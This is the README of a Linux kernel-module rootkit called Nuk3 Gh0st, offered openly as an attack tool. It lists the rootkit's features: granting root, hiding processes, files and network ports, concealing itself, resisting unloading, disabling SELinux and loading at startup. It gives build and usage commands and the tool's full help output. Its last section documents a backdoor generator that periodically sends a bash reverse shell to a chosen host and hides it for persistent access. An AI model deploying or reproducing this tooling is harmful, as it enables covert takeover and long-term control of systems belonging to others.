<img src="https://github.com/JuanSchallibaum/Nuk3Gh0st/blob/master/logo.jpg" width="300" height="300" />

# Nuk3 Gh0st

Universal Linux LKM rootkit, designed to work in any kernel version and both architectures (x86 and x64).

## Why Nuk3 Gh0st?

- Is the most stable Linux LKM rootkit, working in any kernel version from 2.6.32 to 4.17.9.
- Tested on 15 different distros with different kernel versions.
- Can enable rootkit at startup, supporting sysv-init, upstart and systemd.
- Temporaly disables SELINUX if it is present, to load rootkit and enable it at startup withouth problems.
- Can hide ports TCP and UDP of IPv4 and even IPv6.
- Hides itself from be watched trough lsmod, and hides their own files during rootkit loading.
- Easy to use, easy to build and compiles cleanly withouth any warning.

## Functionality

The rootkit can do the following:

- Grant root privileges to a userland process
- Hide process by PID
- Unhide a previously hidden process by PID
- Hide files or directories by their name
- Unhide previously hidden files or directories
- Hide TCP ports (for IPv4 and IPv6)
- Unhide previously hidden TCP ports
- Hide UDP ports (for IPv4 and IPv6)
- Unhide previously hidden UDP ports
- Hide itself
- Unhide itself
- Protect against being unloaded by the user
- Disable the unload protection

## Tested On

|           Distro            |          Kernel         |    Arch    |
|-----------------------------|-------------------------|------------|
| Kali Linux (Rolling)        |  4.17.9                 |   x86_64   |
| Kali Linux (Rolling)        |  4.16.18                |   x86_64   |
| Kali Linux (Rolling)        |  4.14.0-kali3-amd64     |   x86_64   |
| Ubuntu 16.04.4 LTS          |  4.13.0-36-generic      |   x86_64   |
| Fedora 26                   |  4.11.8-300.fc26        |   x86_64   |
| Ubuntu 17.04                |  4.10.0-19-generic      |   x86_64   |
| Debian 9                    |  4.9.0-7-686            |   i686     |
| Kali Linux (Rolling)        |  4.4.142                |   x86_64   |
| Kali Linux (Rolling)        |  3.16.57                |   x86_64   |
| Linux Mint 17               |  3.13.0-37-generic      |   x86_64   |
| Wifislax                    |  3.12.36                |   i686     |
| Fedora 19                   |  3.9.5-301.fc19         |   x86_64   |
| Ubuntu 12.10                |  3.5.0-17-generic       |   i686     |
| Lihuen 5.10 (Debian based)  |  3.2.0-4-amd64          |   x86_64   |
| Ubuntu 10.04.4 LTS          |  2.6.32-38-generic-pae  |   i686     |

## Pre requirements

Install a compiler, Linux headers and all other things required for us to build the rootkit:

#### On Debian based:
```sh
apt-get update
apt-get install linux-headers-$(uname -r)
apt-get install build-essential
```

#### On Red Hat based:
```sh
yum update
yum install linux-headers-$(uname -r)
yum install build-essential
```

## Install
```sh
make
make install
```

## Use

Load rootkit:

```sh
load-nuk3gh0st
```

Use rootkit:

```sh
nuk3gh0st --help


   $$    $$            $$         $$$$$$        
   $$$   $$            $$     $$ $$    $$       
   $$$$  $$  $$    $$  $$    $$        $$       
   $$ $$ $$  $$    $$  $$   $$     $$$$$        
   $$  $$$$  $$    $$  $$$$$$         $$        
   $$   $$$  $$    $$  $$   $$   $$    $$       
   $$    $$   $$$$$$   $$    $$   $$$$$$        

    $$$$$$  $$        $$$$$$             $$     
   $$    $$ $$       $$$   $$            $$     
   $$       $$$$$$$  $$$$  $$  $$$$$$$ $$$$$$   
   $$  $$$$ $$    $$ $$ $$ $$ $$         $$     
   $$    $$ $$    $$ $$  $$$$  $$$$$$    $$     
   $$    $$ $$    $$ $$   $$$       $$   $$ $$  
    $$$$$$  $$    $$  $$$$$$  $$$$$$$    $$$$   

                   By Juan Schällibaum          

   Usage: nuk3gh0st [OPTION]...

   Options:
     --root-shell                 Grants you root shell access.
     --hide-pid=PID               Hides the specified PID.
     --unhide-pid=PID             Unhides the specified PID.
     --hide-file=FILENAME         Hides the specified FILENAME globally.
                                  Must be a filename without any path.
     --unhide-file=FILENAME       Unhides the specified FILENAME.
     --hide-tcp-port=PORT         Hides the specified tcp PORT.
     --unhide-tcp-port=PORT       Unhides the specified tcp PORT.
     --hide-tcp6-port=PORT        Hides the specified tcp6 PORT.
     --unhide-tcp6-port=PORT      Unhides the specified tcp6 PORT.
     --hide-udp-port=PORT         Hides the specified udp PORT.
     --unhide-udp-port=PORT       Unhides the specified udp PORT.
     --hide-udp6-port=PORT        Hides the specified udp6 PORT.
     --unhide-udp6-port=PORT      Unhides the specified udp6 PORT.
     --hide                       Hides the rootkit LKM.
     --unhide                     Unhides the rootkit LKM.
     --help                       Print this help message.
     --protect                    Protects the rootkit from rmmod.
     --unprotect                  Disables the rmmod protection.
```

Unload rootkit:

```sh
unload-nuk3gh0st
```

## Special functionality

Enabling rootkit at system startup:

```sh
startup-nuk3gh0st
```

Disabling rootkit at system startup:

```sh
rmstartup-nuk3gh0st
```

## Uninstall
```sh
make uninstall
```

```sh

 \______   \_____    ____ |  | __ __| _/____   ___________     
  |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \    
  |    |   \ / __ \  \___|    </ /_/ (  <_> |  <_> )  | \/    
  |______  /(____  /\___  >__|_ \____ |\____/ \____/|__|       
         \/      \/     \/     \/    \/                        
                                            __                 
    ____   ____   ____   ________________ _/  |_  ___________  
   / ___\_/ __ \ /    \_/ __ \_  __ \__  \   __\/  _ \_  __ \ 
  / /_/  >  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/ 
  \___  / \___  >___|  /\___  >__|  (____  /__|  \____/|__|    
 /_____/      \/     \/     \/           \/                    
                                                               
    Generates a backdoor that sends bash reverse TCP shell	
        every S seconds to H host, listening on P port         
           and running it on startup, hidding itself           
           	   with Nuk3gh0st LKM rootkit                   
   								
   		        In other words...			
   	    YOU CAN MANTAIN ACCESS FOREVER AND EVER!   		
                                                               
                                                               
 Usage:                                                            
                                                                   
    backdoor-generator --host H --port P --sleep S                 
		Genetares a backdoor that sends bash reverse TCP shell   
		every S seconds to H host listening on P port, and       
 		running it on startup.                                   
		                                                         
    backdoor-generator --remove                                    
		Remove previously generated backdoor from startup        
		and their files.                                         
		                                                         
    backdoor-generator --help                                      
		Show this menu.                                          
```


## License
This project is licensed under [GPLv2](LICENSE).
